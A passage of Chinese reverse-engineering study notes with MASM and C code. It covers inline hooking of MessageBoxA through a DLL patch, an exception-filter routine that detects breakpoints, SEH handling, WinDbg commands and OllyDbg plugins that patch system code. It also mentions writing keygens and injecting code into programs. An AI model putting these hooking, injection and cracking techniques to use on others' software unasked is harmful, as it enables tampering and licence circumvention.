class="line"></span><br></pre></td></tr></table></figure>

<p>代码注入器</p>
<p>汇编库：<br>oddisasm<br>xedparse(x64)<br>asmjit(1)</p>
<p>植物大战僵尸加方格</p>
<h2 id="API-hock"><a href="#API-hock" class="headerlink" title="API hock"></a>API hock</h2><p>comexplorer</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall  ;32 bit memory model</span><br><span class="line">option casemap :none  ;case sensitive</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">include user32.inc</span><br><span class="line"></span><br><span class="line">includelib kernel32.lib</span><br><span class="line">includelib user32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">	g_szUser32 db &quot;user32&quot;, 0</span><br><span class="line">	g_szMessageBoxA db &quot;MessageBoxA&quot;, 0</span><br><span class="line">	g_szNewTitle db &quot;这个标题被我占用了，哈哈&quot;, 0</span><br><span class="line">	g_pfnMessageBoxA dd 0</span><br><span class="line">	g_bIsSelfCall dd FALSE</span><br><span class="line">	;1、注入原生user.dll的messageboxA函数，注入后messagebox第一跳就会变成跳转指定地址，要修改的指令地址赋给ebx，再通过ptr修改指定地址的值</span><br><span class="line">	;2、</span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">;要跳转的地址</span><br><span class="line">HOOKCODE:</span><br><span class="line">	.if g_bIsSelfCall == TRUE</span><br><span class="line">		jmp OLDCODE</span><br><span class="line">	.endif</span><br><span class="line">	</span><br><span class="line">	;重入问题  api hook就是调用程序原有的API  再弹出原先窗口前再弹一个  钩子库？？detours</span><br><span class="line">	mov g_bIsSelfCall, TRUE</span><br><span class="line">	invoke MessageBox, NULL, offset g_szUser32, offset g_szMessageBoxA, MB_OK</span><br><span class="line">	mov g_bIsSelfCall, FALSE</span><br><span class="line">	</span><br><span class="line">	mov dword ptr [esp+0ch], offset g_szNewTitle</span><br><span class="line"></span><br><span class="line">OLDCODE:</span><br><span class="line">	;跳回去</span><br><span class="line">	mov eax, g_pfnMessageBoxA</span><br><span class="line">	add eax, 5 ;下一条指令</span><br><span class="line">	</span><br><span class="line">	;调用被破坏掉的代码</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp, esp</span><br><span class="line">	</span><br><span class="line">	jmp eax</span><br><span class="line"></span><br><span class="line">InstallHook proc uses ebx</span><br><span class="line">	LOCAL @hUser32:HMODULE</span><br><span class="line">	LOCAL @dw01dProc:DWORD</span><br><span class="line">	</span><br><span class="line">	;int 3</span><br><span class="line">	</span><br><span class="line">	;获取User32</span><br><span class="line">	invoke GetModuleHandle, offset g_szUser32</span><br><span class="line">	mov @hUser32, eax</span><br><span class="line">	</span><br><span class="line">	;获取User32的messagebox</span><br><span class="line">	invoke GetProcAddress, @hUser32, offset g_szMessageBoxA</span><br><span class="line">	mov g_pfnMessageBoxA, eax</span><br><span class="line">	</span><br><span class="line">	;计算跳转偏移</span><br><span class="line">	mov eax, offset HOOKCODE</span><br><span class="line">	sub eax, g_pfnMessageBoxA</span><br><span class="line">	sub eax, 5</span><br><span class="line">	</span><br><span class="line">	push eax</span><br><span class="line">	invoke VirtualProtect,g_pfnMessageBoxA,1,PAGE_EXECUTE_READWRITE,addr @dw01dProc</span><br><span class="line">	pop eax</span><br><span class="line">	</span><br><span class="line">	;修改跳转，怎么指定修改的指令的messagebox的第一行</span><br><span class="line">	mov ebx, g_pfnMessageBoxA ; 保存基址信息</span><br><span class="line">	mov byte ptr[ebx], 0e9h  ; 0xE9是JMP机器码   后面的四个字节是偏移</span><br><span class="line">	mov dword ptr[ebx+1], eax  ; e9后面的四个字节是一个偏移地址    偏移地址=目的地址-跳转基地址(jmp的下一条指令的地址）</span><br><span class="line">	</span><br><span class="line">	invoke VirtualProtect,g_pfnMessageBoxA,1,@dw01dProc,addr @dw01dProc</span><br><span class="line">	</span><br><span class="line">	ret</span><br><span class="line">InstallHook endp</span><br><span class="line"></span><br><span class="line">DllMain proc hinstDLL:HINSTANCE, fdwReason:DWORD, lpvReserved:LPVOID</span><br><span class="line">	.if fdwReason == DLL_PROCESS_ATTACH ;首次加载dll自动就执行installHook了</span><br><span class="line">		invoke InstallHook</span><br><span class="line">	.endif</span><br><span class="line">	mov eax, TRUE</span><br><span class="line">	ret</span><br><span class="line">DllMain endp</span><br><span class="line">end DllMain</span><br><span class="line"></span><br><span class="line">; remotedll</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.dll里面默认messagebox的实现</span><br><span class="line">760C15F0 USER32.MessageBoxA       8BFF            mov     edi, edi</span><br><span class="line">760C15F2                          55              push    ebp</span><br><span class="line">760C15F3                          8BEC            mov     ebp, esp</span><br><span class="line">760C15F5                          833D 946C0E76 0&gt;cmp     dword ptr [760E6C94], 0</span><br><span class="line">760C15FC                          74 22           je      short 760C1620</span><br><span class="line">760C15FE                          64:A1 18000000  mov     eax, dword ptr fs:[18]</span><br><span class="line">760C1604                          BA BC710E76     mov     edx, 760E71BC</span><br><span class="line">760C1609                          8B48 24         mov     ecx, dword ptr [eax+24]</span><br><span class="line">760C160C                          33C0            xor     eax, eax</span><br><span class="line">760C160E                          F0:0FB10A       lock cmpxchg dword ptr [edx], ecx</span><br><span class="line">760C1612                          85C0            test    eax, eax</span><br><span class="line">760C1614                          75 0A           jnz     short 760C1620</span><br><span class="line">760C1616                          C705 006D0E76 0&gt;mov     dword ptr [760E6D00], 1</span><br><span class="line">760C1620                          6A FF           push    -1</span><br><span class="line">760C1622                          6A 00           push    0</span><br><span class="line">760C1624                          FF75 14         push    dword ptr [ebp+14]</span><br><span class="line">760C1627                          FF75 10         push    dword ptr [ebp+10]</span><br><span class="line">760C162A                          FF75 0C         push    dword ptr [ebp+C]</span><br><span class="line">760C162D                          FF75 08         push    dword ptr [ebp+8]</span><br><span class="line">760C1630                          E8 3B020000     call    MessageBoxTimeoutA</span><br><span class="line">760C1635                          5D              pop     ebp</span><br><span class="line">760C1636                          C2 1000         retn    10</span><br><span class="line"></span><br><span class="line">;注入后变成</span><br><span class="line">760C15F0 USER32.MessageBoxA     - E9 0BFAF399     jmp     10001000</span><br><span class="line">760C15F5                          833D 946C0E76 0&gt;cmp     dword ptr [760E6C94], 0</span><br><span class="line">760C15FC                          74 22           je      short 760C1620</span><br><span class="line">760C15FE                          64:A1 18000000  mov     eax, dword ptr fs:[18]</span><br><span class="line">760C1604                          BA BC710E76     mov     edx, 760E71BC</span><br><span class="line">760C1609                          8B48 24         mov     ecx, dword ptr [eax+24]</span><br><span class="line">760C160C                          33C0            xor     eax, eax</span><br><span class="line">760C160E                          F0:0FB10A       lock cmpxchg dword ptr [edx], ecx</span><br><span class="line">760C1612                          85C0            test    eax, eax</span><br><span class="line">760C1614                          75 0A           jnz     short 760C1620</span><br><span class="line">760C1616                          C705 006D0E76 0&gt;mov     dword ptr [760E6D00], 1</span><br><span class="line">760C1620                          6A FF           push    -1</span><br><span class="line">760C1622                          6A 00           push    0</span><br><span class="line">760C1624                          FF75 14         push    dword ptr [ebp+14]</span><br><span class="line">760C1627                          FF75 10         push    dword ptr [ebp+10]</span><br><span class="line">760C162A                          FF75 0C         push    dword ptr [ebp+C]</span><br><span class="line">760C162D                          FF75 08         push    dword ptr [ebp+8]</span><br><span class="line">760C1630                          E8 3B020000     call    MessageBoxTimeoutA</span><br><span class="line">760C1635                          5D              pop     ebp</span><br><span class="line">760C1636                          C2 1000         retn    10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10001000                  8BC0            mov     eax, eax</span><br><span class="line">10001002                  C74424 0C 13300&gt;mov     dword ptr [esp+C], 10003013</span><br><span class="line">1000100A                  A1 2C300010     mov     eax, dword ptr [1000302C]</span><br><span class="line">1000100F                  83C0 05         add     eax, 5</span><br><span class="line">10001012                  55              push    ebp</span><br><span class="line">10001013                  8BEC            mov     ebp, esp</span><br><span class="line">10001015                  FFE0            jmp     eax</span><br><span class="line">10001017                  55              push    ebp</span><br><span class="line">10001018                  8BEC            mov     ebp, esp</span><br><span class="line">1000101A                  83C4 F8         add     esp, -8</span><br><span class="line">1000101D                  53              push    ebx</span><br><span class="line">1000101E                  68 00300010     push    10003000; ASCII &quot;user32&quot;</span><br><span class="line">10001023                  E8 72000000     call    1000109A; jmp 到 KERNEL32.GetModuleHandleA</span><br><span class="line">10001028                  8945 FC         mov     dword ptr [ebp-4], eax</span><br><span class="line">1000102B                  68 07300010     push    10003007; ASCII &quot;MessageBoxA&quot;</span><br><span class="line">10001030                  FF75 FC         push    dword ptr [ebp-4]</span><br><span class="line">10001033                  E8 68000000     call    100010A0; jmp 到 KERNEL32.GetProcAddress</span><br><span class="line">10001038                  A3 2C300010     mov     dword ptr [1000302C], eax</span><br><span class="line">1000103D                  B8 00100010     mov     eax, 10001000</span><br><span class="line">10001042                  2B05 2C300010   sub     eax, dword ptr [1000302C]; USER32.MessageBoxA</span><br><span class="line">10001048                  83E8 05         sub     eax, 5</span><br><span class="line">1000104B                  50              push    eax</span><br><span class="line">1000104C                  8D45 F8         lea     eax, dword ptr [ebp-8]</span><br><span class="line">1000104F                  50              push    eax</span><br><span class="line">10001050                  6A 40           push    40</span><br><span class="line">10001052                  6A 01           push    1</span><br><span class="line">10001054                  FF35 2C300010   push    dword ptr [1000302C]; USER32.MessageBoxA</span><br><span class="line">1000105A                  E8 47000000     call    100010A6; jmp 到 KERNEL32.VirtualProtect</span><br><span class="line">1000105F                  58              pop     eax</span><br><span class="line">10001060                  8B1D 2C300010   mov     ebx, dword ptr [1000302C]; USER32.MessageBoxA</span><br><span class="line">10001066                  C603 E9         mov     byte ptr [ebx], 0E9</span><br><span class="line">10001069                  8943 01         mov     dword ptr [ebx+1], eax</span><br><span class="line">1000106C                  8D45 F8         lea     eax, dword ptr [ebp-8]</span><br><span class="line">1000106F                  50              push    eax</span><br><span class="line">10001070                  FF75 F8         push    dword ptr [ebp-8]</span><br><span class="line">10001073                  6A 01           push    1</span><br><span class="line">10001075                  FF35 2C300010   push    dword ptr [1000302C]; USER32.MessageBoxA</span><br><span class="line">1000107B                  E8 26000000     call    100010A6; jmp 到 KERNEL32.VirtualProtect</span><br><span class="line">10001080                  5B              pop     ebx</span><br><span class="line">10001081                  C9              leave</span><br><span class="line">10001082                  C3              retn</span><br></pre></td></tr></table></figure>



<h2 id="钢琴和筛选器异常"><a href="#钢琴和筛选器异常" class="headerlink" title="钢琴和筛选器异常"></a>钢琴和筛选器异常</h2><p>筛选器异常 &#x2F; 最终异常</p>
<p>setUnhand</p>
<p>dump文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">   include windows.inc</span><br><span class="line">   include user32.inc</span><br><span class="line">   include kernel32.inc</span><br><span class="line">   </span><br><span class="line">   includelib user32.lib</span><br><span class="line">   includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">	g_szMsg  db &quot;异常来了,是否跳过异常？&quot;, 0</span><br><span class="line">	g_szTxt  db &quot;没有发现CC断点&quot;, 0</span><br><span class="line">	g_szTip  db &quot;发现CC断点&quot;, 0</span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">MyUnhandledExceptionFilter proc pEP:ptr EXCEPTION_POINTERS</span><br><span class="line">	LOCAL @pEr:ptr EXCEPTION_RECORD</span><br><span class="line">	LOCAL @pCtx:ptr CONTEXT</span><br><span class="line">	</span><br><span class="line">	mov ebx, pEP</span><br><span class="line">	assume ebx:ptr EXCEPTION_POINTERS</span><br><span class="line">	mov eax, [ebx].pExceptionRecord</span><br><span class="line">	mov @pEr, eax</span><br><span class="line">	</span><br><span class="line">	mov eax, [ebx].ContextRecord</span><br><span class="line">	mov @pCtx, eax</span><br><span class="line">	</span><br><span class="line">	mov ebx, @pEr</span><br><span class="line">	assume ebx:ptr EXCEPTION_RECORD</span><br><span class="line">	</span><br><span class="line">	mov esi, @pCtx</span><br><span class="line">	assume esi:ptr CONTEXT</span><br><span class="line"></span><br><span class="line">	.if [ebx].ExceptionCode == EXCEPTION_ACCESS_VIOLATION</span><br><span class="line">		add [esi].regEip, 2</span><br><span class="line">		;设置TF标志位，继续执行</span><br><span class="line">		or [esi].regFlag,100h</span><br><span class="line">	.elseif [ebx].ExceptionCode == EXCEPTION_SINGLE_STEP</span><br><span class="line">		;&#x27;判断是否有CC</span><br><span class="line">		mov eax, [esi].regEip</span><br><span class="line">		;invoke MessageBox, NULL,addr byte ptr [eax] , NULL, MB_OK</span><br><span class="line">		;ret</span><br><span class="line">		.if byte ptr [eax] == 033h ;0cch</span><br><span class="line">			invoke MessageBox, NULL,offset g_szTip, NULL, MB_OK</span><br><span class="line">			mov eax, EXCEPTION_EXECUTE_HANDLER</span><br><span class="line">			ret</span><br><span class="line">		.endif</span><br><span class="line">		</span><br><span class="line">		;没有到达代码结束位置</span><br><span class="line">		.if[esi].regEip != offset CODE_END</span><br><span class="line">			;没有发现CC，继续单步</span><br><span class="line">			or [esi].regFlag, 100h</span><br><span class="line">		.endif</span><br><span class="line">	.endif</span><br><span class="line">	</span><br><span class="line">	assume esi:nothing</span><br><span class="line">	assume ebx:nothing</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	mov eax, EXCEPTION_CONTINUE_EXECUTION ;程序继续执行</span><br><span class="line">	</span><br><span class="line">	ret</span><br><span class="line">MyUnhandledExceptionFilter endp</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">	;28</span><br><span class="line">	invoke SetUnhandledExceptionFilter, offset MyUnhandledExceptionFilter</span><br><span class="line">	</span><br><span class="line">	xor eax, 8</span><br><span class="line">	mov eax, [eax]</span><br><span class="line"></span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	xor eax, eax</span><br><span class="line">	</span><br><span class="line">CODE_END:</span><br><span class="line">	invoke MessageBox, NULL, offset g_szTxt, NULL, MB_OK</span><br><span class="line">	invoke ExitProcess,eax</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>



<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>exe程序<br>1、修改程序自身汇编代码（加个弹窗提示）<br>2、根据程序的算法逻辑写注册机（编写ASM程序）<br>3、编写汇编直接注入对应程序（代码&#x2F;工具），汇编库就是写C程序调用汇编对应API<br>4、编写DLL(汇编)，用DLL注入工具</p>
<h2 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h2><p>一般断点，把打断点处的第一个字节替换成 cc</p>
<p>代码同上</p>
<p>TF标志位置1断点</p>
<p>异常错误码</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_NT_SYMBOL_PATH</span><br><span class="line">srv*C:\symbolslocal*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>

<p>1、源码调试（汇编源码&#x2F;C语言源码）必须有pdb文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bl 查看断点</span><br><span class="line">bc 3-255 取消断点</span><br><span class="line">bp user32!CreateWindowExA</span><br><span class="line">bm user32!Create*A</span><br><span class="line">bu 延迟断点，未加载的DLL函数</span><br><span class="line">$exentry 程序入口点</span><br><span class="line"></span><br><span class="line">teb thread environment block(结构体)</span><br><span class="line">dt _teb ;名称粉碎</span><br><span class="line">dt 00338000 _teb</span><br><span class="line"></span><br><span class="line">dt _PEB </span><br><span class="line"></span><br><span class="line">!teb</span><br><span class="line">!peb</span><br></pre></td></tr></table></figure>



<p>sehf</p>
<p>结构化异常处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">异常处理:</span><br><span class="line">-&gt; 调试器 -&gt; SEH -&gt; 调试器 -&gt; 筛选器 -&gt;系统</span><br><span class="line">SEH在筛选器前处理</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">   include windows.inc</span><br><span class="line">   include user32.inc</span><br><span class="line">   include kernel32.inc</span><br><span class="line">   </span><br><span class="line">   includelib user32.lib</span><br><span class="line">   includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">Node struct </span><br><span class="line">	next dd 0</span><br><span class="line">	handler dd 0</span><br><span class="line">Node ends</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">	g_sz0 db &quot; 0 异常来了&quot;, 0</span><br><span class="line">	g_sz1 db &quot;1 异常来了&quot;, 0</span><br><span class="line">.code </span><br><span class="line"></span><br><span class="line">Handler1 proc pER:ptr EXCEPTION_RECORD, pEstablisherFrame:DWORD, pCtx:ptr CONTEXT, pDispatcherContext:DWORD</span><br><span class="line">	mov ebx, pER</span><br><span class="line">	assume ebx:ptr EXCEPTION_RECORD</span><br><span class="line">	</span><br><span class="line">	mov esi,pCtx</span><br><span class="line">	assume esi:ptr CONTEXT</span><br><span class="line">	</span><br><span class="line">	invoke MessageBox,NULL,offset g_sz1, NULL,MB_OK</span><br><span class="line">	</span><br><span class="line">	.if [ebx].ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO</span><br><span class="line">		add[esi].regEip,2</span><br><span class="line">	.elseif[ebx].ExceptionCode == EXCEPTION_ACCESS_VIOLATION</span><br><span class="line">		mov eax,ExceptionContinueSearch</span><br><span class="line">		ret</span><br><span class="line">	.endif</span><br><span class="line">	</span><br><span class="line">	assume ebx:nothing</span><br><span class="line">	assume esi:nothing</span><br><span class="line">	</span><br><span class="line">	mov eax, ExceptionContinueExecution </span><br><span class="line">	ret</span><br><span class="line">Handler1 endp</span><br><span class="line"></span><br><span class="line">Func1 proc</span><br><span class="line">	LOCAL @node:Node</span><br><span class="line">	</span><br><span class="line">	mov @node.handler, offset Handler1</span><br><span class="line">	</span><br><span class="line">	;安装SEH</span><br><span class="line">	assume fs:nothing</span><br><span class="line">	mov eax,fs:[0]</span><br><span class="line">	mov @node.next,eax</span><br><span class="line">	</span><br><span class="line">	lea eax,@node</span><br><span class="line">	mov fs:[0], eax</span><br><span class="line"></span><br><span class="line">	xor esi, esi</span><br><span class="line">	div esi  ;赋0异常</span><br><span class="line">	</span><br><span class="line">	xor eax,eax</span><br><span class="line">	mov [eax],eax ;内存访问异常</span><br><span class="line">	</span><br><span class="line">	;卸掉SEH</span><br><span class="line">	mov eax, @node.next</span><br><span class="line">	mov fs:[0], eax</span><br><span class="line"></span><br><span class="line">	ret</span><br><span class="line">Func1 endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Handler0 proc pER:ptr EXCEPTION_RECORD, pEstablisherFrame:DWORD, pCtx:ptr CONTEXT, pDispatcherContext:DWORD</span><br><span class="line">	mov ebx, pER</span><br><span class="line">	assume ebx:ptr EXCEPTION_RECORD</span><br><span class="line">	</span><br><span class="line">	mov esi,pCtx</span><br><span class="line">	assume esi:ptr CONTEXT</span><br><span class="line">	</span><br><span class="line">	invoke MessageBox,NULL, offset g_sz0,NULL,MB_OK</span><br><span class="line">	</span><br><span class="line">	.if [ebx].ExceptionCode == EXCEPTION_ACCESS_VIOLATION</span><br><span class="line">		add [esi].regEip,2</span><br><span class="line">	.endif</span><br><span class="line">	</span><br><span class="line">	assume ebx:nothing</span><br><span class="line">	assume esi:nothing</span><br><span class="line">	</span><br><span class="line">	mov eax,ExceptionContinueExecution</span><br><span class="line">	;mov eax，ExceptionContinueSearch：交给调试器或者筛选器处理</span><br><span class="line">	ret</span><br><span class="line">Handler0 endp</span><br><span class="line"></span><br><span class="line">Func0 proc </span><br><span class="line">	LOCAL @node:Node</span><br><span class="line">	</span><br><span class="line">	mov @node.handler, offset Handler0</span><br><span class="line">	</span><br><span class="line">	;安装SEH</span><br><span class="line">	assume fs:nothing</span><br><span class="line">	mov eax, fs:[0]</span><br><span class="line">	mov @node.next, eax</span><br><span class="line">	</span><br><span class="line">	lea eax, @node</span><br><span class="line">	mov fs:[0],eax  ;安装异常，安装在这个函数</span><br><span class="line">	</span><br><span class="line">	invoke Func1</span><br><span class="line">	</span><br><span class="line">	xor eax,eax</span><br><span class="line">	mov [eax],eax ;内存访问异常</span><br><span class="line">	</span><br><span class="line">	;卸掉SEH</span><br><span class="line">	mov eax, @node.next</span><br><span class="line">	mov fs:[0], eax</span><br><span class="line">	</span><br><span class="line">	ret</span><br><span class="line">Func0 endp</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line"></span><br><span class="line">	invoke Func0</span><br><span class="line">	invoke MessageBox,NULL,NULL,NULL,MB_OK</span><br><span class="line">	</span><br><span class="line">	xor eax, eax</span><br><span class="line">	invoke ExitProcess,eax</span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>RadASM 工程选项<br>-&gt; 编译  &#x2F;Zi<br>-&gt; 链接  &#x2F;debug &#x2F;pdb:”TestSEH.pdb”</p>
<p>生成pdb能在调试过程中更清楚地看函数</p>
<h2 id="OD插件"><a href="#OD插件" class="headerlink" title="OD插件"></a>OD插件</h2><p>OD插件都是DLL文件，创建动态链接库<br>比如：OD开启时加载插件DLL，修改某个异常判断的地址，从而修改异常处理机制<br>修改异常派发<br>OD插件都是DLL文件，<strong>创建动态链接库</strong></p>
<h3 id="异常处理插件"><a href="#异常处理插件" class="headerlink" title="异常处理插件"></a>异常处理插件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kernelbase -&gt; UnhandledExceptionFilter </span><br><span class="line">(UnhandledExceptionFilter)</span><br><span class="line">76F722A0 </span><br><span class="line">找到异常处理分支，查找跳，不抛给调试工具处理，返回给程序本身处理</span><br><span class="line">(关键跳)</span><br><span class="line">76F7235D   /0F84 E6000000   je      76F72449</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/57.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/58.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Plugin.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ollydbg.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ODBG_Plugindata</span><span class="params">(<span class="type">char</span>* shortname)</span></span><br><span class="line">&#123;</span><br><span class="line">    strcpy_s(shortname, <span class="number">31</span>, <span class="string">&quot;od测试插件&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> PLUGIN_VERSION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ODBG_Plugininit</span><span class="params">(<span class="type">int</span> ollydbgversion, HWND hw, ulong* features)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ODBG_Paused</span><span class="params">(<span class="type">int</span> reason, t_reg* reg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == PP_EVENT)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//获取unhandle的地址</span></span><br><span class="line">        <span class="comment">//字符集问题，项目-&gt;项目名-&gt;高级-&gt;字符集</span></span><br><span class="line">        HMODULE hKernel = GetModuleHandle(<span class="string">&quot;kernelbase.dll&quot;</span>); </span><br><span class="line">        LPBYTE pAddr = (LPBYTE)GetProcAddress(hKernel, <span class="string">&quot;UnhandledExceptionFilter&quot;</span>);</span><br><span class="line">        <span class="comment">//定位跳转</span></span><br><span class="line">        <span class="comment">//76F7235D - 76F722A0 + 1</span></span><br><span class="line">        pAddr += <span class="number">0xBE</span>;</span><br><span class="line">        BYTE btCode = <span class="number">0x84</span>; </span><br><span class="line">        Writememory(&amp;btCode, (ulong)pAddr, <span class="keyword">sizeof</span>(btCode), MM_SILENT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">//修改内存属性需要申请权限</span></span><br><span class="line"><span class="comment">DWORD dwOldProC = 0;</span></span><br><span class="line"><span class="comment">VirtualProtect(pAddr, 1, PAGE_EXECUTE_READWRITE, &amp;dwOldProC);</span></span><br><span class="line"><span class="comment">//jnz修改为jz</span></span><br><span class="line"><span class="comment">//调试问题，项目-&gt;项目名-&gt;调试-&gt;命令-&gt;ODexe</span></span><br><span class="line"><span class="comment">*pAddr = 0x84;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//改错进程，改成OD自己的地址，要改被调试程序</span></span><br><span class="line"><span class="comment">//还要注意调用时机,选合适的回调(触发)函数</span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PS：右键分析代码</p>
<h3 id="进程跟踪地址错误"><a href="#进程跟踪地址错误" class="headerlink" title="进程跟踪地址错误"></a>进程跟踪地址错误</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Plugin.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ollydbg.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">MyGetClassLongA</span><span class="params">(_In_ HWND hWnd,</span></span><br><span class="line"><span class="params">                _In_ <span class="type">int</span> nIndex)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (IsWindowUnicode(hWnd)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> GetClassLongW(hWnd, nIndex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> GetClassLongA(hWnd, nIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 01.42</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ODBG_Plugindata</span><span class="params">(<span class="type">char</span>* shortname)</span></span><br><span class="line">&#123;</span><br><span class="line">    strcpy_s(shortname, <span class="number">31</span>, <span class="string">&quot;od测试插件2&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> PLUGIN_VERSION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ODBG_Plugininit</span><span class="params">(<span class="type">int</span> ollydbgversion, HWND hw, ulong* features)</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwOldProc = <span class="number">0</span>;</span><br><span class="line">    LPDWORD pAddrToGetCL = (LPDWORD)<span class="number">0x0050D858</span>;</span><br><span class="line">    VirtualProtect(pAddrToGetCL,<span class="keyword">sizeof</span>(DWORD),PAGE_EXECUTE_READWRITE, &amp;dwOldProc);</span><br><span class="line">    </span><br><span class="line">    *pAddrToGetCL = (DWORD)MyGetClassLongA;</span><br><span class="line">    </span><br><span class="line">    VirtualProtect(pAddrToGetCL, <span class="keyword">sizeof</span>(DWORD),dwOldProc,&amp;dwOldProc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ODBG_Paused</span><span class="params">(<span class="type">int</span> reason, t_reg* reg)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



